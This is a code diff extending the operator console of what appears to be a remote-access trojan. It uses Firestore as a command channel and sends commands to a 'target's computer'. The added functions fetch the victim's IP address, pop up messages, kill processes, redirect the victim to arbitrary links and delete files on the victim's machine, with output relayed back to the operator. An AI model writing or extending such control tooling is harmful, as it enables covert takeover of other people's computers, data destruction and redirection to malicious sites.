@@ -42,8 +42,16 @@ def listen_to_output():
             doc_time = doc.create_time.timestamp()
             if current_time - doc_time <= 3:
                 output_data = doc.to_dict()
-                # output recieved text can get put here... (print(recieved)) if ykyk i dont want it tho
-                print(Fore.LIGHTBLACK_EX + "output >> " + Fore.LIGHTMAGENTA_EX + output_data["output"]) #prints output
+                # Check if the output is a list
+                if isinstance(output_data["output"], list):
+                    for output_item in output_data["output"]:
+                        if isinstance(output_item, dict):
+                            output_item_str = json.dumps(output_item)  # Convert dictionary to string
+                        else:
+                            output_item_str = output_item
+                        print(Fore.LIGHTBLACK_EX + "output >> " + Fore.LIGHTMAGENTA_EX + str(output_item_str))  # prints output
+                else:
+                    print(Fore.LIGHTBLACK_EX + "output >> " + Fore.LIGHTMAGENTA_EX + str(output_data["output"]))  # prints output
                 return True
         # If no recent output found, wait for 1 second before checking again
         if time.time() - start_time > 11:
@@ -207,6 +215,64 @@ def run_task():
     if not listen_to_output():
         print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
+def get_ip():
+    data = {
+        "command": "!ip"
+    }
+    write_to_firestore("commands", data)
+    spacebreak()
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
+    if not listen_to_output():
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
+
+def send_message():
+    message_text = input(Fore.LIGHTBLACK_EX + "message text >> " + Fore.LIGHTMAGENTA_EX)
+    data = {
+        "command": "!message",
+        "messagetxt": message_text
+    }
+    write_to_firestore("commands", data)
+    spacebreak()
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
+    if not listen_to_output():
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
+
+def kill_task():
+    task_to_kill = input(Fore.LIGHTBLACK_EX + "task to kill >> " + Fore.LIGHTMAGENTA_EX)
+    data = {
+        "command": "!kill",
+        "task": task_to_kill
+    }
+    write_to_firestore("commands", data)
+    spacebreak()
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
+    if not listen_to_output():
+        print(Fore.LIGHTBLACK_EX + "output not created, the target's computer is probably switched off")
+
+def redirect_command():
+    redirect_link = input(Fore.LIGHTBLACK_EX + "redirect to link >> " + Fore.LIGHTMAGENTA_EX)
+    data = {
+        "command": "!redirect",
+        "redirectlink": redirect_link
+    }
+    write_to_firestore("commands", data)
+    spacebreak()
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
+    if not listen_to_output():
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
+
+def delete_file():
+    file_path = input(Fore.LIGHTBLACK_EX + "path to file to delete >> " + Fore.LIGHTMAGENTA_EX)
+    data = {
+        "command": "!delete",
+        "filepath": file_path
+    }
+    write_to_firestore("commands", data)
+    spacebreak()
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
+    if not listen_to_output():
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
+        
 def main():
     while True:
         spacebreak()
@@ -237,6 +303,16 @@ def main():
             ls_command()
         elif command.strip() == "!ls.storage":
             ls_storage()
+        elif command.strip() == "!ip":
+            get_ip()
+        elif command.strip() == "!message":
+            send_message()
+        elif command.startswith("!kill"):
+            kill_task() 
+        elif command.startswith("!redirect"):
+            redirect_command()
+        elif command.startswith("!delete"):
+            delete_file()
         else:
             spacebreak()
             print(Fore.LIGHTBLACK_EX + "error >> command not recognized")
